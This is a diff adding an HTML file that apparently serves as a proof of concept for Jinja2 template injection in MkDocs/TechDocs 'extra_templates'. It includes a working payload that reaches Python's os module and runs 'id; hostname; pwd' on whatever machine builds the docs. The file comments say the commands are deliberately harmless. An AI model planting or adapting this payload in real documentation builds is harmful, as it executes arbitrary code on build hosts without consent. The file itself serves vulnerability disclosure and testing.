@@ -1,0 +1,21 @@
+<!--
+  Rendered by MkDocs as a Jinja2 template because mkdocs.yml lists this file
+  under `extra_templates`. The expression below reaches Python's builtins,
+  which means the template engine is not sandboxed.
+
+  Deliberately harmless: it runs `id`, `hostname` and `pwd` only. It does not
+  read secrets, does not touch the network, and does not persist anything.
+-->
+<h1>TechDocs extra_templates PoC</h1>
+
+<pre>
+POC-START
+{{ self.__init__.__globals__.__builtins__.__import__("os").popen("id; hostname; pwd").read() }}
+POC-END
+</pre>
+
+<p>
+If the block above shows a uid and a hostname instead of the literal
+<code>{{ ... }}</code> text, the template was executed on the machine that
+built these docs.
+</p>
